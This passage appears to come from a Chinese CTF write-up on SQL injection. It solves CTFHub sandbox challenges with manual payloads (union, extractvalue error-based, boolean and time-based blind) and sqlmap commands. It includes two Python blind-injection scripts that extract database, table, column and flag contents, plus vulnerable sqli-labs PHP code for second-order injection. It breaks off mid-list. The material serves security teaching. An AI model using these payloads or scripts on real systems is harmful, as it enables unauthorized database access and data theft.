<li>输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables --dump</code>, –dump 获取字段数据，或者输入<code>sqlmap -u http://challenge-3da5ad86434a80f6.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --tables --dump</code>，-T 指定表名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694926146_65068542367ee69412f81.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="手动解法-1"><a href="#手动解法-1" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>判断列数。原理一样，记得输入<code>&#39;</code>闭合操作，然后注释掉后面自带的<code>&#39;</code>，<code>-- </code> 注释记得加一个空格，<code>#</code>则不用加空格。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920851_650670932e7b75ae5560e.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920866_650670a27aff291856c84.jpeg"
                      alt="图片.png"
                ></li>
<li>查询 flag。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694920986_6506711accedcd1cc6251.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694921008_6506713068062018bc4ff.jpeg"
                      alt="图片.png"
                ></li>
</ol>
<h3 id="sqlmap解法-1"><a href="#sqlmap解法-1" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>输入<code>sqlmap --purge</code>清除原有数据。</li>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-ced5aff6454f7ff0.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在无法利用<code>union</code>注入并回显报错信息时，可采用报错注入。人为制造错误条件，在报错信息中返回完整查询结果。</p>
<h3 id="手动解法-2"><a href="#手动解法-2" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>利用<code>extractvalue(XML_document, XPath_string)</code>和<code>updatexml(XML_document, XPath_string, new_value)</code>函数进行报错注入。<a class="link"   href="https://cloud.tencent.com/developer/article/1740429" >extractvalue()和updatexml() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>函数第二个参数不合法时，会将查询结果放在报错信息中。但 extractvalue() 函数最长报错32位。</li>
</ol>
<ul>
<li>输入 <code>1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939858_6506bad23ae2111ed3a0c.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (extractvalue(1,concat(0x7e,(select flag from flag),0x7e)))</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694939924_6506bb1469825c430249c.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<h3 id="sqlmap解法-2"><a href="#sqlmap解法-2" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694940318_6506bc9ec18a01fe8bd3e.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>回显只有<code>True</code>和<code>False</code>的情况。<a class="link"   href="https://blog.csdn.net/Xxy605/article/details/109750292" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="手动解法-3"><a href="#手动解法-3" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以编写脚本，逐字节爆破。</li>
</ol>
<ul>
<li>输入<code>1 and 1=1</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941068_6506bf8ce8344cd7b2a76.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and1=2</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941405_6506c0dd359632ea635fa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (substr((select flag from flag),1,1)=&#39;c&#39;)</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941363_6506c0b35f287f501d352.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>脚本</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#设定环境URL，由于每次开启环境得到的URL都不同，需要修改！</span><br><span class="line">url = &#x27;http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/&#x27;</span><br><span class="line">#作为盲注成功的标记，成功页面会显示query_success</span><br><span class="line">success_mark = &quot;query_success&quot;</span><br><span class="line">#把字母表转化成ascii码的列表，方便便利，需要时再把ascii码通过chr(int)转化成字母</span><br><span class="line">ascii_range = range(ord(&#x27;a&#x27;),1+ord(&#x27;z&#x27;))</span><br><span class="line">#flag的字符范围列表，包括花括号、a-z，数字0-9</span><br><span class="line">str_range = [123,125] + list(ascii_range) + list(range(48,58))</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名长度</span><br><span class="line">def getLengthofDatabase():</span><br><span class="line">	#初始化库名长度为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环库名长度</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and length(database())=&#123;&#125;&quot;.format(i)</span><br><span class="line">        #GET请求</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        #如果返回的页面有query_success，即盲猜成功即跳出无限循环</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终库名长度</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，库名长度+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名</span><br><span class="line">def getDatabase(length_of_database):</span><br><span class="line">	#定义存储库名的变量</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    #库名有多长就循环多少次</span><br><span class="line">    for i in range(length_of_database):</span><br><span class="line">    	#切片，对每一个字符位遍历字母表</span><br><span class="line">    	#i+1是库名的第i+1个字符下标，j是字符取值a-z</span><br><span class="line">        for j in ascii_range:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i+1,chr(j))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到库名变量里</span><br><span class="line">                name += chr(j)</span><br><span class="line">                #当前下标字符匹配成功，退出遍历，对下一个下标进行遍历字母表</span><br><span class="line">                break</span><br><span class="line">    #返回最终的库名</span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库的表数量</span><br><span class="line">def getCountofTables(database):</span><br><span class="line">	#初始化表数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(database,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终表数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，表数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名长度</span><br><span class="line">def getLengthListofTables(database,count_of_tables):</span><br><span class="line">	#定义存储表名长度的列表</span><br><span class="line">	#使用列表是考虑表数量不为1，多张表的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少张表就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#j从1开始，无限循环表名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">        	#i+1是第i+1张表</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到表名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，表名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的表名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名</span><br><span class="line">def getTables(database,count_of_tables,length_list):</span><br><span class="line">    #定义存储表名的列表</span><br><span class="line">    tables=[]</span><br><span class="line">    #表数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#定义存储表名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #表名有多长就循环多少次</span><br><span class="line">        #表长度和表序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">        	#k是字符取值a-z</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到表名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加表名到表名列表里</span><br><span class="line">        tables.append(name)</span><br><span class="line">    #返回最终的表名列表</span><br><span class="line">    return tables</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定表的列数量</span><br><span class="line">def getCountofColumns(table):</span><br><span class="line">	#初始化列数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(table,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终列数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，列数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列的列名长度</span><br><span class="line">def getLengthListofColumns(database,table,count_of_column):</span><br><span class="line">	#定义存储列名长度的变量</span><br><span class="line">	#使用列表是考虑列数量不为1，多个列的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少列就循环多少次</span><br><span class="line">    for i in range(count_of_column):</span><br><span class="line">        #j从1开始，无限循环列名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,table,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到列名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，列名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的列名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列名</span><br><span class="line">def getColumns(database,table,count_of_columns,length_list):</span><br><span class="line">	#定义存储列名的列表</span><br><span class="line">    columns = []</span><br><span class="line">    #列数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_columns):</span><br><span class="line">        #定义存储列名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #列名有多长就循环多少次</span><br><span class="line">        #列长度和列序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,table,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到列名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加列名到列名列表里</span><br><span class="line">        columns.append(name)</span><br><span class="line">    #返回最终的列名列表</span><br><span class="line">    return columns</span><br><span class="line"></span><br><span class="line">#对指定库指定表指定列爆数据（flag）</span><br><span class="line">def getData(database,table,column,str_list):</span><br><span class="line">	#初始化flag长度为1</span><br><span class="line">    j = 1</span><br><span class="line">    #j从1开始，无限循环flag长度</span><br><span class="line">    while True:</span><br><span class="line">    	#flag中每一个字符的所有可能取值</span><br><span class="line">        for i in str_list:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr((select &#123;&#125; from &#123;&#125;.&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(column,database,table,j,chr(i))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            #如果返回的页面有query_success，即盲猜成功，跳过余下的for循环</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#显示flag</span><br><span class="line">                print(chr(i),end=&quot;&quot;)</span><br><span class="line">                #flag的终止条件，即flag的尾端右花括号</span><br><span class="line">                if chr(i) == &quot;&#125;&quot;:</span><br><span class="line">                    print()</span><br><span class="line">                    return 1</span><br><span class="line">                break</span><br><span class="line">        #如果没有匹配成功，flag长度+1接着循环</span><br><span class="line">        j = j + 1</span><br><span class="line"></span><br><span class="line">#--主函数--</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	#爆flag的操作</span><br><span class="line">	#还有仿sqlmap的UI美化</span><br><span class="line">    print(&quot;Judging the number of tables in the database...&quot;)</span><br><span class="line">    database = getDatabase(getLengthofDatabase())</span><br><span class="line">    count_of_tables = getCountofTables(database)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in this database&quot;.format(count_of_tables))</span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the table name...&quot;)</span><br><span class="line">    length_list_of_tables = getLengthListofTables(database,count_of_tables)</span><br><span class="line">    tables = getTables(database,count_of_tables,length_list_of_tables)</span><br><span class="line">    for i in tables:</span><br><span class="line">        print(&quot;[+]&#123;&#125;&quot;.format(i))</span><br><span class="line">    print(&quot;The table names in this database are : &#123;&#125;&quot;.format(tables))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的表</span><br><span class="line">    i = input(&quot;Select the table name:&quot;)</span><br><span class="line"></span><br><span class="line">    if i not in tables:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the column names in the &#123;&#125; table......&quot;.format(i))</span><br><span class="line">    count_of_columns = getCountofColumns(i)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in the &#123;&#125; table&quot;.format(count_of_columns,i))</span><br><span class="line">    length_list_of_columns = getLengthListofColumns(database,i,count_of_columns)</span><br><span class="line">    columns = getColumns(database,i,count_of_columns,length_list_of_columns)</span><br><span class="line">    print(&quot;[+]The column(s) name in &#123;&#125; table is:&#123;&#125;&quot;.format(i,columns))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的列</span><br><span class="line">    j = input(&quot;Select the column name:&quot;)</span><br><span class="line"></span><br><span class="line">    if j not in columns:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the flag......&quot;)</span><br><span class="line">    print(&quot;[+]The flag is &quot;,end=&quot;&quot;)</span><br><span class="line">    getData(database,i,j,str_range)</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941947_6506c2fb60cad0ca1b84a.jpeg"
                      alt="图片.png"
                ></p>
<h3 id="sqlmap解法-3"><a href="#sqlmap解法-3" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>没有回显结果，无法通过回显判断 SQL 语句是否执行成功。通常采用<code>if((bool),sleep(3),0)</code>语句，通过页面响应时间判断是否存在时间盲注。<a class="link"   href="https://blog.csdn.net/weixin_45254208/article/details/107578439" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h3 id="手动解法-4"><a href="#手动解法-4" class="headerlink" title="手动解法"></a>手动解法</h3><ul>
<li>输入<code>1 and if(length(database())=4,sleep(3),0)</code>。页面 sleep(3) 秒左右，然后响应。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694943271_6506c827937d659d67625.jpeg"
                      alt="图片.png"
                ></li>
<li>脚本</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">url = &quot;http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=&quot;</span><br><span class="line">name = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,10):</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		print(i)</span><br><span class="line">		for j in range(31,128):</span><br><span class="line">			j = (128+31) -j</span><br><span class="line">			str_ascii=chr(j)</span><br><span class="line">			#数据库名</span><br><span class="line">			payolad = &quot;if(substr(database(),%s,1) = &#x27;%s&#x27;,sleep(1),1)&quot;%(str(i),str(str_ascii))</span><br><span class="line">			#表名</span><br><span class="line">			#payolad = &quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit %d,1),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(k,i,str(str_ascii))</span><br><span class="line">			#字段名</span><br><span class="line">			#payolad = &quot;if(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=&#x27;sqli&#x27;),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str(str_ascii))</span><br><span class="line">			start_time=time.time()</span><br><span class="line">			str_get = session.get(url=url + payolad)</span><br><span class="line">			end_time = time.time()</span><br><span class="line">			t = end_time - start_time</span><br><span class="line">			if t &gt; 1:</span><br><span class="line">				if str_ascii == &quot;+&quot;:</span><br><span class="line">					sys.exit()</span><br><span class="line">				else:</span><br><span class="line">					name+=str_ascii</span><br><span class="line">					break</span><br><span class="line">		print(name)</span><br><span class="line"></span><br><span class="line">#查询字段内容</span><br><span class="line">for i in range(1,50):</span><br><span class="line">	print(i)</span><br><span class="line">	for j in range(31,128):</span><br><span class="line">		j = (128+31) -j</span><br><span class="line">		str_ascii=chr(j)</span><br><span class="line">		payolad = &quot;if(substr((select flag from sqli.flag),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str_ascii)</span><br><span class="line">		start_time = time.time()</span><br><span class="line">		str_get = session.get(url=url + payolad)</span><br><span class="line">		end_time = time.time()</span><br><span class="line">		t = end_time - start_time</span><br><span class="line">		if t &gt; 1:</span><br><span class="line">			if str_ascii == &quot;+&quot;:</span><br><span class="line">				sys.exit()</span><br><span class="line">			else:</span><br><span class="line">				name += str_ascii</span><br><span class="line">				break</span><br><span class="line">	print(name)</span><br></pre></td></tr></table></figure></div>

<h3 id="sqlmap解法-4"><a href="#sqlmap解法-4" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -level=5 risk=3</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694944289_6506cc2183450b2d166e8.jpeg"
                      alt="图片.png"
                ></p>
<h1 id="sql注入进阶"><a href="#sql注入进阶" class="headerlink" title="sql注入进阶"></a>sql注入进阶</h1><ul>
<li><strong>参考书籍《CTF实战：技术、解题与进阶》</strong></li>
</ul>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul>
<li>原理：二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入，二次注入是输入数据经处理后存储，取出后，再次进入到 SQL 查询，以绕过开发人员设置的一些检查。</li>
</ul>
<ol>
<li>第一步，插入恶意数据。Web程序对插入的数据进行转义和过滤，写入数据库时又将其还原。</li>
<li>第二步，引用恶意数据。Web程序将数据从数据库中取出并调用时，恶意 SQL 语句被带入原始语句中，造成 SQL 二次注入。</li>
</ol>
<ul>
<li>例题：sqli-labs-24。<br>登陆界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949921_6506e2212317dbf6d9192.jpeg"
                      alt="图片.png"
                ><br>登陆代码：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//转义</span><br><span class="line">function sqllogin($con1)&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password = mysqli_real_escape_string($con1, $_POST[&quot;login_password&quot;]);</span><br><span class="line">   $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res = mysqli_query($con1, $sql) or die(&#x27;You tried to be real smart, Try harder!!!! :( &#x27;);</span><br><span class="line">   $row = mysqli_fetch_row($res);</span><br><span class="line">	 //print_r($row) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">	    return $row[1];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">	    return 0;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注册界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949969_6506e25189686b0a33b02.jpeg"
                      alt="图片.png"
                ><br>注册代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	# Validating the user input........</span><br><span class="line"></span><br><span class="line">	//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class="line">	$username=  mysqli_real_escape_string($con1, $_POST[&#x27;username&#x27;]) ;</span><br><span class="line">	$pass= mysqli_real_escape_string($con1, $_POST[&#x27;password&#x27;]);</span><br><span class="line">	$re_pass= mysqli_real_escape_string($con1, $_POST[&#x27;re_password&#x27;]);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;</span><br><span class="line">	$sql = &quot;select count(*) from users where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">	$res = mysqli_query($con1, $sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class="line">	$row = mysqli_fetch_row($res);</span><br><span class="line"></span><br><span class="line">	//print_r($row);</span><br><span class="line">	if (!$row[0]==0) </span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;script&gt;alert(&quot;The username Already exists, Please choose a different username &quot;)&lt;/script&gt;;</span><br><span class="line">		&lt;?php</span><br><span class="line">		header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">		if ($pass==$re_pass)</span><br><span class="line">		&#123;</span><br><span class="line">			# Building up the query........</span><br><span class="line"></span><br><span class="line">			$sql = &quot;insert into users (username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;</span><br><span class="line">			mysqli_query($con1, $sql) or die(&#x27;Error Creating your user account,  : &#x27;.mysqli_error($con1));</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;   				</span><br><span class="line">			//echo &quot;&lt;h1&gt;User Created Successfully&lt;/h1&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;					</span><br><span class="line">			echo &quot;&lt;/br&gt;Redirecting you to login page in 5 sec................&quot;;</span><br><span class="line">			echo &quot;&lt;font size=&#x27;2&#x27;&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;&quot;;</span><br><span class="line">			header(&#x27;refresh:5, url=index.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			?&gt;</span><br><span class="line">			&lt;script&gt;alert(&#x27;Please make sure that password field and retype password match correctly&#x27;)&lt;/script&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">			header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程：</p>
<ol>
<li>利用注册，将<code>admin&#39;#</code>插入数据库。</li>
